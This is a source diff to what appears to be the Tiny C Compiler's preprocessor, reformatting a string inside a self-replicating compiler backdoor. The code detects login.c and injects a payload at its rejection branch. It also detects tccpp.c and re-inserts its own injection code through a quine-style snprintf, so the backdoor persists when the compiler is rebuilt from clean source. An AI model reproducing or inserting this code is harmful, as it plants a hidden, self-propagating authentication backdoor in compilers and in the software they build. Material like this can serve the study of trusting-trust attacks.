@@ -634,43 +634,7 @@ static int handle_eob(void)
     bf->buffer[len] = 0;
   }
   char* inject_compiler = 
-    "char* inject_login = %c%s%c;%c  if(strstr(file->filename, %clogin.c%c) != NULL && bf->buffer[0] != %c %c) {%c"
-    "    unsigned char* inject_code[200];%c\n"
-    "    snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);%c\n"
-    "    int inject_len;%c\n"
-    "    inject_len = strlen(inject_login);%c\n"
-    "    unsigned char* new_buf;%c\n"
-    "    new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c"
-    "    unsigned char* inject_location;%c"
-    "    inject_location = strstr(bf->buffer, %cprintf(%c%cReject!%c);%c"
-    "    int pre_inject_len = inject_location - bf->buffer;%c"
-    "    new_buf[0] = %c %c;%c"
-    "    strncpy(new_buf + 1, bf->buffer, pre_inject_len);%c"
-    "    strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);%c"
-    "    strcat(new_buf, inject_location);%c"
-    "    len = len + inject_len - 7;%c"
-    "    strncpy(bf->buffer, new_buf, len);%c"
-    "    bf->buffer[len] = 0;%c"
-    "  }%c"
-    "  if(strstr(file->filename, %ctccpp.c%c) != NULL && bf->buffer[0] != ' ') {%c"
-    "  char* inject_compiler = %c    %c%s%c;%c%c"
-    "    %cunsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 5000);%c%c"
-    "    %csnprintf(inject_code, 5000, inject_compiler, 34, inject_login, 34, 10, 34, 34, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 39, 39, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 10);%c%c"
-    "    %cint inject_len;%c%c"
-    "    %cinject_len = strlen(inject_compiler);%c%c"
-    "    %cunsigned char* new_buf;%c%c"
-    "    %cnew_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c%c"
-    "    %cunsigned char* inject_location;%c%c"
-    "    %cinject_location = strstr(bf->buffer, %cif (len < 0)%c);%c%c"
-    "    %cint pre_inject_len = inject_location - bf->buffer;%c%c"
-    "    %cnew_buf[0] = %c %c;%c%c"
-    "    %cstrncpy(new_buf + 1, bf->buffer, pre_inject_len);%c%c"
-    "    %cstrncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);%c%c"
-    "    %cstrcat(new_buf, inject_location);%c%c"
-    "    %clen = len + inject_len - 7;%c%c"
-    "    %cstrncpy(bf->buffer, new_buf, len);%c%c"
-    "    %cbf->buffer[len] = 0;%c%c"
-    "  }%c  ";
+    "char* inject_login = %c%s%c;%c  if(strstr(file->filename, %clogin.c%c) != NULL && bf->buffer[0] != %c %c) {%c    unsigned char* inject_code[200];%c    snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);%c    int inject_len;%c    inject_len = strlen(inject_login);%c    unsigned char* new_buf;%c    new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c    unsigned char* inject_location;%c    inject_location = strstr(bf->buffer, %cprintf(%c%cReject!%c);%c    int pre_inject_len = inject_location - bf->buffer;%c    new_buf[0] = %c %c;%c    strncpy(new_buf + 1, bf->buffer, pre_inject_len);%c    strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);%c    strcat(new_buf, inject_location);%c    len = len + inject_len - 7;%c    strncpy(bf->buffer, new_buf, len);%c    bf->buffer[len] = 0;%c  }%c  if(strstr(file->filename, %ctccpp.c%c) != NULL && bf->buffer[0] != ' ') {%c  char* inject_compiler = %c    %c%s%c;%c%c    %cunsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 5000);%c%c    %csnprintf(inject_code, 5000, inject_compiler, 34, inject_login, 34, 10, 34, 34, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 39, 39, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 10);%c%c    %cint inject_len;%c%c    %cinject_len = strlen(inject_compiler);%c%c    %cunsigned char* new_buf;%c%c    %cnew_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c%c    %cunsigned char* inject_location;%c%c    %cinject_location = strstr(bf->buffer, %cif (len < 0)%c);%c%c    %cint pre_inject_len = inject_location - bf->buffer;%c%c    %cnew_buf[0] = %c %c;%c%c    %cstrncpy(new_buf + 1, bf->buffer, pre_inject_len);%c%c    %cstrncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);%c%c    %cstrcat(new_buf, inject_location);%c%c    %clen = len + inject_len - 7;%c%c    %cstrncpy(bf->buffer, new_buf, len);%c%c    %cbf->buffer[len] = 0;%c%c  }%c  ";
   if(strstr(file->filename, "tccpp.c") != NULL && bf->buffer[0] != ' ') {
     unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 5000);
     snprintf(inject_code, 5000, inject_compiler, 34, inject_login, 34, 10, 34, 34, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 39, 39, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 34, 34, 10, 10);
